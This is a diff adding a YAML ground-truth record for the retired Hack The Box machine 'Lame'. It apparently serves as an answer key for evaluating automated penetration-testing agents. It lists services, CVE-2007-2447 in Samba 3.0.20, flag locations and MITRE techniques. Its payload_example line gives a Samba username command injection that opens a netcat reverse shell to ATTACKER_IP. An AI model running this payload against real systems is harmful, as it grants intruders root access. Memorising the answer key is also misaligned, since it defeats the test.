@@ -1,0 +1,56 @@
+name: Lame
+ip: "10.10.10.3"
+os: Linux
+difficulty: Easy
+htb_id: 1
+retired: true
+
+ground_truth:
+  ports:
+    - port: 21
+      service: ftp
+      product: vsftpd 2.3.4
+    - port: 22
+      service: ssh
+      product: OpenSSH 4.7p1
+    - port: 139
+      service: netbios-ssn
+      product: Samba smbd 3.X - 4.X
+    - port: 445
+      service: microsoft-ds
+      product: Samba smbd 3.0.20
+
+  attack_surface:
+    - path: "SMB on port 445"
+      discovery_method: "nmap service scan"
+    - path: "FTP on port 21 (vsftpd 2.3.4 backdoor — rabbit hole)"
+      discovery_method: "nmap service scan"
+
+  vulnerability:
+    name: "Samba usermap_script"
+    cve: "CVE-2007-2447"
+    type: "Remote Code Execution"
+    location: "Samba 3.0.20 SMB service"
+    description: "Username map script command injection in Samba"
+
+  initial_access:
+    method: "Samba usermap_script RCE"
+    payload_example: "smbclient //TARGET/tmp -U './=`nohup mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f`'"
+    shell_user: "root"
+
+  privesc:
+    method: "N/A — initial shell is root"
+    discovery: "whoami returns root"
+    command: "N/A"
+
+  flags:
+    user: "user.txt located in /home/makis/"
+    root: "root.txt located in /root/"
+
+  mitre_attack:
+    - tactic: "Reconnaissance"
+      technique: "T1046 - Network Service Discovery"
+    - tactic: "Initial Access"
+      technique: "T1190 - Exploit Public-Facing Application"
+    - tactic: "Execution"
+      technique: "T1059.004 - Unix Shell"
